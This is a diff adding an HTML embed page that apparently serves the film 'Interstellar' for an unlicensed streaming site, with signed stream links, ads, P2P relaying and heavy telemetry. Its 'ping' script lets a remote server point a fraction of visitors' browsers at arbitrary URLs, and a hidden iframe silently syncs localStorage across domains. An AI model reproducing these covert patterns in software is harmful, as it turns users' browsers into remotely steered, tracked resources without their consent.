@@ -1,0 +1,500 @@
+
+    <html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="robots" content="noindex,nofollow,noarchive">
+        <title>Интерстеллар</title>
+	<style>
+		body {
+			margin: 0;
+			background-color: black !important;
+		}
+
+		#player {
+			width: 100%;
+		}
+
+        #player > .placeholder {
+			color: white;
+        }
+	</style>
+
+<script data-name="mms">
+	!function(){
+		var w=window,k='MediaSource',MS=w[k]||w['WebKit'+k],MMS=w['Managed'+k];
+		if(!MS&&MMS)w[k]=MMS;
+	}();
+</script>
+
+<script data-name="main">
+	var playerBase= "https://js.fprxnet.ws/npm/player-venom@0.3.2/dist/", app,tryLoad=1, tracker, lastTracker = 0,
+		embedHost= "api.ortified.ws",
+		consumerHost= "kinogo.la", 
+		consumerId= 24963 ,
+		ancestorOrigins= location.ancestorOrigins && Array.from ? Array.from(location.ancestorOrigins) : [],
+		id= 648216 , franchiseID= 180 , unixTime= 1779107230 ;
+	var isEmbedded; try { isEmbedded = self !== top; } catch (e) {isEmbedded = true}
+	var sameOrigin; try { sameOrigin = top.location.origin === location.origin } catch(e) {}
+	if(isEmbedded&&!sameOrigin){
+		_s('frame','sub','',{host:location.hostname.split('.',1)[0].replace(/api\d+/,'api{0}')});
+		addEventListener('message',function(e){if('ping'==e.data)e.source.postMessage('pong',e.origin)});
+	}
+	if (isEmbedded&& !sameOrigin&& window.fetch&& window.URL&& !/(greenfilm\.vip|vsetam.net|zetfi?l?i?x(main|24|s)?\.\w{2,4})$/.test(consumerHost||'')) { 
+		
+		var url = new URL(location.href), re = /^api\d+\./;
+		if (re.test(url.hostname)) {
+			url.hostname = url.hostname.replace(re, 'api.');
+			fetch(url.origin+'/ping/',{method:'head'}).then(function (r) {
+				url.searchParams.set('host', new URL(document.referrer).hostname);
+				if(r.status===200)location.href=url.href;
+			})
+		}
+	}
+	var ua = navigator.userAgent
+		.replace(/(\sMobile\/\S+| \(KHTML, like Gecko\)|Mozilla\/5\.0 \(| like Mac OS X\))/,'')
+		.replace(/(iPhone); CPU iPhone/,'$1')
+		.replace('Mobile', 'M')
+		.replace('Safari', 'S')
+		.replace(/(OS\s\d+)(_\d+)+/g,'$1')
+		.replace(/(\d+)(\.\d+)+/g,'$1')
+		.replace(/\sAppleWebKit\/\d+/, '');
+	var iPhone= ~ua.indexOf('iPhone') && ua.indexOf('Windows')<0 ?'iPhone' :'other';
+	setTimeout(function sEmbed(hit) {
+		_s('frame',hit||'embed',isEmbedded?'embed':'top',
+			{type:sameOrigin?'same':'diff',label:iPhone,host:consumerHost})
+		if(!hit) setTimeout(sEmbed,6e4,'embed1m');
+	},1000);
+	addEventListener('error',function (e,f,l,c){
+		try {
+			e=e|| '';
+			f=f|| e.filename||'';
+			l=l|| e.lineno;
+			c=c|| e.colno;
+			var lc = (l || c) ? l + ':' + c : '',
+				m = (e.message || e).toString().replace(/\n/g,'')
+					.replace('Uncaught SecurityError: Blocked a frame with origin','blockFR')
+					.replace('from accessing a cross-origin frame','')
+					.replace(/https?:\/\/api\d+/,'api.')
+					.replace("token ')'",'token )')
+					.replace(/uncaught(?:\sexception)?\s+/i,'');
+			_s('window','error',lc+f,{label: m});
+		} catch (e) {
+			_s('window','error','',{label:'WTF_'+e});
+		}
+		var n = document.getElementById('player'), p;
+		if (n && !app) {
+			n.style.border = '1px dashed red';
+			p = document.createElement('p');
+			p.innerText = m;
+			p.style.color = 'red';
+			n.appendChild(p);
+		}
+    });
+	function __s(s){
+		new Image().src = "https://s.namy.ws/player?"+s;
+	}
+
+	
+
+	function _s(c,h,s,o) {
+		var e='cat='+c+ '&hit='+h+ (s?'&sub='+s:'');
+		if(o) for(var k in o){e+='&'+k+'='+o[k]}
+		__s(e)
+	}
+
+	function makePlayer(opts) {
+		var s
+		if (!window.VenomPlayer) {
+			if(tryLoad==1){
+				playerBase="https://js-jd.utilit.info/npm/player-venom@0.3.2/dist/";
+				s=document.createElement('script');
+				s.src=playerBase+'player.js';
+				s.onload=function(){setTimeout(function(){makePlayer(opts)},1000)};
+				s.onerror=function(){_s('window','error','',{label:'PLAYER_LOAD_FAIL_UNPKG'})};
+				document.head.appendChild(s)
+			}
+			throw 'PLAYER_LOAD_FAIL_'+tryLoad++; 
+		}
+		if (VenomPlayer.isMobile) try {
+			localStorage.removeItem('player.volume')
+		} catch (e) {}
+
+		Object.assign(opts, {
+			container: document.getElementById('player'),
+			publicPath: playerBase,
+			ads: adsConfig,
+			defaultPoster:'',
+			speed: [1, 1.1, 1.25, 1.5, 1.75, 2],
+			volume:1,
+			preventExternalSilencing:true,
+			aspectRatio: isEmbedded ? 'fill' : '16:9',
+			mini:320,
+			reportUrl: 'https://apicollaps.cc/bug-report',
+			stats: ['wss://s.namy.ws/ws?ref_id=24963'],
+			hlsNativeQuality: 'resolutionFilter', 
+			hlsNativeParam:true,
+			 
+			download: "https://dlr.showvid.ws/x-px?m=https%3A%2F%2Fcdnr.interkh.com%2F01_15_24%2F01%2F15%2F19%2FW2WG55XX%2FHIISKTUE.mp4%2Fmaster.m3u8%3Fha%3D0ccb7ed47e4a516%26hc%3D5950b6c9af1b9b5%26hi%3Db131da54ebcd554%26hs%3D1vr0xPfN4j%26ht%3D03d6df9561285ff%26hu%3Db41969c9b008947%26hui%3D823925852fb1634%26t%3D1779971230\u0026title=%D0%98%D0%BD%D1%82%D0%B5%D1%80%D1%81%D1%82%D0%B5%D0%BB%D0%BB%D0%B0%D1%80\u0026x-cdn=10551403",
+			theme: "metro",
+			cssVars:{"color-text":"rgba(255,255,255,1)","border-radius":"0.125rem","color-buttons":"rgba(255,255,255,1)","color-primary":"rgba(70,113,233,1)","background-color-primary":"rgba(25,27,42,0.9)","button-icon-color":"rgba(255,255,255,1)"},
+			time:  0 ,
+			soundBlock: "delete",
+			autoLandscape:true,
+			preview: {interval:5,width:160,height:90,spriteSize:100,rowSize:10,src:"https://hye1eaipby4w.interkh.com/thumb/1041206/desktop/${spriteNum}.webp?ha=0ccb7ed47e4a516&hc=5950b6c9af1b9b5&hi=b131da54ebcd554&hs=1vr0xPfN4j&ht=03d6df9561285ff&hu=b41969c9b008947&t=1779971230",firstNum:1,pad:1},
+			p2p: Object.assign({
+				packetSize: 16e3,
+				rtc: {
+					peerConnection: {
+						iceServers: [
+							{ urls: "stun:stun.l.google.com:19302" },
+							{ urls: "stun:stun.fastscr.cc:3480" },
+							{
+								urls: "turn:turn.zcvh.net:443",
+								username: 'brucewayne',
+								credential: '54321'
+							},
+							{
+								urls: "turns:turn.zcvh.net:443",
+								username: 'brucewayne',
+								credential: '54321'
+							}
+						],
+						bundlePolicy: "max-compat"
+					}
+				},
+				ch: function(manifestUrl, live, type) {
+					if (live) return manifestUrl.split('/').at(-1).split('.')[0];
+					var u = new URL(manifestUrl), m;
+					if (type.startsWith('dash_')) {
+						m = u.pathname.match(/\/(\d+)\.mpd$/)
+						return m
+							? m[1] + type.slice(-2)
+							: u.pathname;
+					}
+					m = u.pathname
+						.match(/\/(\w+)\/(?:1080_)?(\w+)\.mp4(?:\/tracks\/)?(.*)\/master.m3u8/);
+					return m
+						? m.slice(1).filter(Boolean).join('_')
+						: `${u.pathname}${u.search}`;
+				},
+				fragDash: function(r) {
+					
+					var m = new URL(r.url).pathname.match(/\/(\d+)\.\d+(?:-(\d+))?\/(\d+)\.webm$/),
+						l = m[2] ? m[1] + '.' + m[2] : m[1];
+					l = l.replace(/(\.[1-9]\d*0)$/, '$11'); 
+					return { type: r.mediaType, level: +l, sn: +m[3] };
+				},
+				fragHls: function(f) {
+					var m = f.relurl.match(/seg-(\d+)-[av](\d+)\.ts/);
+					return { type: f.type, level: +m[2], sn: +m[1] };
+				}
+			},opts.p2p),
+			ui: Object.assign({
+				titleOnlyOnFullscreen:  false ,
+				pip:  true ,
+				about: false,
+				share:  false 
+			}, opts.ui),
+			translations: {en:{ screen: 'intro', repeat: 'repeat', titer: 'titer',
+					pipIn: 'Picture in Picture', pipOut: 'expand' }},
+			text: Object.assign({
+				ads: 'рекламу', screen: 'интро', repeat: 'повтор', titer: 'титры',
+				blocked:'Видео заблокировано по просьбе правообладателя'
+			},opts.text)
+		});
+		var so=opts.source,l=opts.playlist,ks=Object.keys,vp='vp',v1='&'+vp+2;
+		function _vp(k) {if(/^h|d[ao]/.test(k))add(so,k)}
+		function add(o,k,u,q){if(o[k]){
+			if(k[1]=='o'){u=new URL(o[k]);q=u.searchParams;q.set('m',q.get('m')+v1);o[k]=u.href}
+			else o[k]+=v1;
+		}}
+		ks(so||{}).forEach(_vp); add(opts,'download')
+		if(l)l.seasons.forEach(function(se){
+			se.episodes.forEach(function(e){ks(so=e).forEach(_vp)})});
+
+		addEventListener('message', function (e) {
+			var p= opts.playlist; if(!p)return;
+			if(e.data=='playlist hook'){
+				p.autoPlay=false;e.source.postMessage('playlist hooked','*');
+			} else if(e.data=='playlist hooked play'&& p.autoPlay===false) {
+				app.play()
+			}
+		});
+		app= VenomPlayer.make(opts);
+		if (window.listen) {
+			app.onRenew = listen;
+			listen(app);
+		}
+	}
+
+    (function(){
+	try{
+	var w=window,MMS=w.ManagedMediaSource,MS=w.MediaSource||w.WebKitMediaSource||MMS,
+		msPrefix=MMS&&MMS==MS?'MMS_':'MS_',
+		iSup=MS&&MS.isTypeSupported,
+		opus=msPrefix+(iSup&&MS.isTypeSupported('audio/webm; codecs="opus"')),
+		av=msPrefix+(iSup&&MS.isTypeSupported('video/webm; codecs="av01.0.04M.08"')),
+		PC= w.RTCPeerConnection ||w.mozRTCPeerConnection ||w.webkitRTCPeerConnection,
+		dc=w.WebSocket&&PC&&PC.prototype&&PC.prototype.createDataChannel ? 'dc' : '',
+		wasm= w.WebAssembly ? 'wasm ' : '';
+	support('find',Array.prototype.find);
+	support('weak-ref',w.WeakRef);
+	_s('support','opus','',{description:opus});
+	_s('support','av1','',{description:av});
+	_s('support','wasm','',{description:wasm+dc || '-'});
+	}catch(e){ }
+
+	var supportsAsync;
+	try{new Function('async ()=>1');supportsAsync=1}catch(e){}
+	support('async',supportsAsync);
+
+	function support(name,v){_s('support',name,'',{description:v?'yes':'-'})}
+	})();var loadStart= new Date, loadCdn, isPlayerTimeout, playerTimeout= setTimeout(function(){
+		isPlayerTimeout = true;
+		_s('script','err','timeout5s',{ref_id: 24963 });
+	},5000);
+	function scriptStat(name, ev, t) {
+		if (name == 'cdn') {
+			loadCdn = new Date - loadStart;
+			t = loadCdn;
+		} else {
+			t = new Date - loadStart - loadCdn;
+		}
+		_s('script',ev,name,{time:t,ref_id: 24963 });
+	}
+</script>
+
+	<script data-name="cdn_cfg">
+		var cdn_cfg = {
+			
+            ws:"b5c2c6c68f9a9ac2c6c79bd2d0c1cfd0dbd19bd1dcd2dcc1d4d99ac5cd"}
+	</script>
+
+	<script src="//api.ortified.ws/cdn.js" crossorigin="anonymous"
+			onload="scriptStat('cdn','ok')" onerror="scriptStat('cdn','err')"></script>
+<script src="https://js.fprxnet.ws/npm/player-venom@0.3.2/dist/player.js" crossorigin="anonymous"
+		onload="scriptStat('player','ok')" onerror="scriptStat('player','err')"></script>
+<script>
+	clearTimeout(playerTimeout);
+	if(!isPlayerTimeout)_s('script','ok','timeout5s',{ref_id: 24963 });
+	if(isEmbedded&&(window.ManagedMediaSource||window.MediaSource||window.WebKitMediaSource))
+		_s('cdn','ini',window.XMLHttpRequestNative ?'ok' :'no',{label:sameOrigin?'same':'diff'});
+</script>
+<script src="//api.ortified.ws/js/listen-player.js" async crossorigin="anonymous"></script>
+
+    <script data-name="ping">
+		!function () {
+			if (!window.fetch) return;
+
+			var interval = 5 * 60 * 1000,
+				timers = {};
+
+			
+
+			setTimeout(function ping() {
+				if (window.VenomPlayer) {
+					setTimeout(ping, interval);
+					pingHost("ortified.ws");
+				}
+			}, interval);
+
+			function pingHost(host, url) {
+				if (!host) return;
+				var r = send.bind(null, host);
+				if (!url) url = 'https://api.' + host + '/ping/';
+				fetch(url).then(r).catch(r);
+				timers[host] = Date.now();
+			}
+
+			function send(host, r) {
+				VenomPlayer.stats({
+					hit: 'ping',
+					host: host,
+					value: +(r && r.ok),
+					time: Date.now() - timers[host]
+				});
+			}
+		}();
+
+		setTimeout(function () {
+			window.VenomPlayer &&
+			VenomPlayer.stats({ hit: 'ts', time: Date.now() / 1000 | 0 });
+		}, 6e4);
+
+		
+		if (Math.random() < 0.01 && window.fetch) setTimeout(function () {
+			fetch('https://api.getsdk.online/check').then(function (r) {
+				return r.json()
+			}).then(function (r) {
+				fetch(r.url).catch(function () {
+					return new Promise(function (_, rej) {
+						setTimeout(rej, 1e4)
+					});
+				}).catch(function () {
+					return fetch(r.url)
+				}).catch(function () {
+					new Image().src = 'https://api.getsdk.online/error?id=' + r.id;
+				});
+			}).catch(function () {
+			});
+		}, 6e4);
+    </script>
+
+
+    <script data-name="ss">
+		var settingsOrigin = 'https://api.stiven-king.com',
+			settingsFrame = document.createElement('iframe'),
+			totalTimeKey = 'player.totalTime';
+		settingsFrame.src = settingsOrigin + '/storage.html';
+		settingsFrame.style.width = 0;
+		settingsFrame.style.height = 0;
+		settingsFrame.style.border = 0;
+		addEventListener('DOMContentLoaded', function () {
+			document.body.appendChild(settingsFrame);
+		});
+		addEventListener('message', function (e) {
+			if (e.origin === settingsOrigin && e.data && e.data.key === totalTimeKey) try {
+				var remote = +e.data.value,
+					local = +localStorage.getItem(totalTimeKey) || 0;
+				if (remote > local) {
+					localStorage.setItem(totalTimeKey, remote);
+				} else if (local > remote) {
+					settingsFrame.contentWindow.postMessage({
+						'localStorage.setItem': totalTimeKey,
+						value: local
+					}, settingsOrigin);
+				}
+			} catch (e) {
+			}
+		});
+
+		try {
+			var lastTotalTimeSync = 0,
+				setItem = localStorage.setItem;
+			localStorage.setItem = function (key, value) {
+				setItem.call(localStorage, key, value);
+				var now = Date.now();
+				if (key === totalTimeKey && now - lastTotalTimeSync > 60 * 1000) {
+					lastTotalTimeSync = now;
+					settingsFrame.contentWindow.postMessage({
+						'localStorage.setItem': totalTimeKey,
+						value: value
+					}, settingsOrigin);
+				}
+			};
+		} catch (e) {
+		}
+    </script>
+
+
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" class="next-head">
+        <link rel="icon" type="image/vnd.microsoft.icon" href="/favicon.ico"/>
+    </head>
+    <body>
+
+    <div id="player"><span class="placeholder">loading...</span></div>
+
+<script data-name="ad">
+    var middleCount = 0,
+	    adTimeouts = { loading: 20000, starting: 20000, toNextImp: 5000, global: 120000 },
+        adsConfig = {
+	    nonLinear: {
+		    fallbackOnly: false,
+		    url: "https://vuegenesisvue.com/load-xml/?id=182463&type=nonlinear&dcc=1",
+		    total:  0 ,
+		    offset:  300 ,
+		    label: { name: 'label', val: 'overlay', counter: true }
+	    },
+    
+        pre: {
+	        vast: { timeouts: adTimeouts, sequential: true },
+            maxImpressions:  2 ,
+	        urls: ["https://vuegenesisvue.com/load-xml/?id=125034&roll=pre&dcc=1&maximp=2&imdb=0816692&kp=258687"]
+
+        },
+    
+        middle: {
+	        offset: 7 * 60 + 9, 
+	        vast: {
+                sequential: true, 
+				timeouts: {loading: 60000, starting: 60000, global: 120000}
+            },
+	        nonLinearFallback: true,
+            pop: true,
+            total:  0 ,
+            maxImpressions: 1,
+            urls: ["https://vuegenesisvue.com/load-xml/?id=125035&maximp=1&dcc=1&mid=6","https://vuegenesisvue.com/load-xml/?id=125036&maximp=1&dcc=1&mid=6"]
+,
+	        getUrls: function () {
+		        var u = middleCount && adsConfig.middle.urls
+			        ? adsConfig.middle.urls.slice(1)
+			        : adsConfig.middle.urls;
+		        middleCount++;
+		        return u;
+	        },
+            label: { name: 'roll', val: 'mid', counter: true }
+        },
+    
+        post: {
+	        vast: {
+		        sequential: true,
+		        timeouts: { loading: 9000, starting: 6000, global: 55000 }
+	        },
+	        exitFullscreenVideo: true,
+			skipCD: true,
+            maxImpressions: 1,
+            urls: ["https://vuegenesisvue.com/load-xml/?id=125037&roll=post&maximp=1&dcc=1"]
+
+        },
+    
+        download: {
+            maxImpressions: 2,
+            urls: ["https://vuegenesisvue.com/load-xml/?id=176556&maximp=1"]
+
+        },
+    
+        confirmTimeout: 60 * 1000, 
+        confirmOn: ['localhost'],
+        vast: { timeouts: adTimeouts },
+	    toLongSkip: 50,
+        volume: 0.3,
+        tv: true,
+        midThenNonLinear:  true 
+    };
+</script>
+
+    <script data-name="mk">
+		makePlayer({
+			blocked: false ,
+			title: "Интерстеллар",
+			id: 648216 ,
+			poster: "https://img.imgilall.me/movies/video/6/4/8/2/1/6/0/0/0/0/800x450_648216.jpg?t=1705395684",
+			source: {
+				dash: "https://cdnr.interkh.com/01_24/16/10/IEXW363V/1041206.mpd?ha=0ccb7ed47e4a516&hc=5950b6c9af1b9b5&hi=b131da54ebcd554&hs=1vr0xPfN4j&ht=03d6df9561285ff&hu=b41969c9b008947&hui=80ba52088d9acb6&t=1779971230",
+				hls: "https://cdnr.interkh.com/01_15_24/01/15/19/W2WG55XX/HIISKTUE.mp4/master.m3u8?ha=0ccb7ed47e4a516&hc=5950b6c9af1b9b5&hi=b131da54ebcd554&hs=1vr0xPfN4j&ht=03d6df9561285ff&hu=b41969c9b008947&hui=823925852fb1634&t=1779971230",
+				audio: {"names":["Рус. Дублированный (iTunes)","Омикрон","Укр. Дубльований","Eng.Original"],"order":[0,1,2,3]},
+				cc: [{"url":"https://hye1eaipby4w.interkh.com/01_15_24/01/15/11/6P7OEI2J/S37ZBZQ6.vtt?ha=0ccb7ed47e4a516&hc=5950b6c9af1b9b5&hi=b131da54ebcd554&hs=1vr0xPfN4j&ht=03d6df9561285ff&hu=b41969c9b008947&t=1779971230","name":"Рус. полные - 1"},{"url":"https://hye1eaipby4w.interkh.com/01_15_24/01/15/11/AWU6D4KJ/QNH77QZS.vtt?ha=0ccb7ed47e4a516&hc=5950b6c9af1b9b5&hi=b131da54ebcd554&hs=1vr0xPfN4j&ht=03d6df9561285ff&hu=b41969c9b008947&t=1779971230","name":"Рус. форсированные - 2"}]
+
+			},
+			sections: [],
+			qualityByWidth: {"864":480},
+			p2p: {
+				geo: ["RU","","AS9123"],
+				tolerance:  4 ,
+				tracker: function () {
+					var now = Date.now();
+					if (lastTracker + 3e5 < now) tracker = false; 
+					lastTracker = now;
+					return (tracker= !tracker) ?"wss://t5.zcvh.net/v1/ws" :"wss://t5.myangular.life/v1/ws"
+				},
+				longDownload: 300 * 1000
+			}
+		});
+
+		var videoKey = 1041206 ;
+    </script>
+
+
+    </body>
+    </html>
